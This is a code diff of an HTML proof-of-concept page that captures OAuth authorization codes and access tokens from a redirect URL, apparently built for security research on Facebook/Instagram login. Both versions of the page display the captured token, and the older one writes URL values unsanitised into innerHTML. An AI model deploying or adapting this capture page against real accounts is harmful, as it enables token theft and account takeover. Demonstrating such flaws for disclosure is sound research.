@@ -1,45 +1,18 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>FB/IG Security Research - PoC</title>
-    <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4; }
-        .box { border: 2px solid #ff0000; padding: 20px; background: white; display: inline-block; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        .leaked-code { color: #d32f2f; font-weight: bold; word-break: break-all; font-family: monospace; background: #ffebee; padding: 10px; margin-top: 20px; border: 1px dashed #d32f2f; }
-    </style>
+    <title>Security Research - Access Token Capture</title>
 </head>
 <body>
-
-    <div class="box">
-        <h1>Vulnerability Confirmed!</h1>
-        <p>This page has successfully captured the sensitive OAuth Code from the redirect.</p>
-        
-        <div id="result">
-            <p>Waiting for data...</p>
-        </div>
-    </div>
+    <h1>Security Test in Progress</h1>
+    <p id="token-display">Waiting for response...</p>
 
     <script>
-        // التقاط المعاملات من الرابط
-        const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get('code');
-        const token = urlParams.get('access_token');
-        const resultDiv = document.getElementById('result');
-
-        if (code || token) {
-            resultDiv.innerHTML = `
-                <h3 style="color: green;">Data Leaked Successfully:</h3>
-                <div class="leaked-code">
-                    ${code ? "<strong>AUTH_CODE:</strong> " + code : ""}
-                    ${token ? "<br><strong>ACCESS_TOKEN:</strong> " + token : ""}
-                </div>
-                <p style="margin-top:20px;"><strong>Impact:</strong> Full Account Takeover is possible using this code.</p>
-            `;
-            // تنبيه بسيط لتأكيد النجاح عند التصوير
-            console.log("Vulnerability PoC: Data captured!");
-        } else {
-            resultDiv.innerHTML = "<p>No sensitive data found in URL. Please trigger the exploit again.</p>";
+        // هذا الكود يسحب التوكن من رابط العنوان (URL Fragment)
+        const hash = window.location.hash;
+        if (hash.includes('access_token')) {
+            document.getElementById('token-display').innerText = "Captured Token: " + hash;
+            console.log("Full Hash Captured:", hash);
         }
     </script>
 </body>
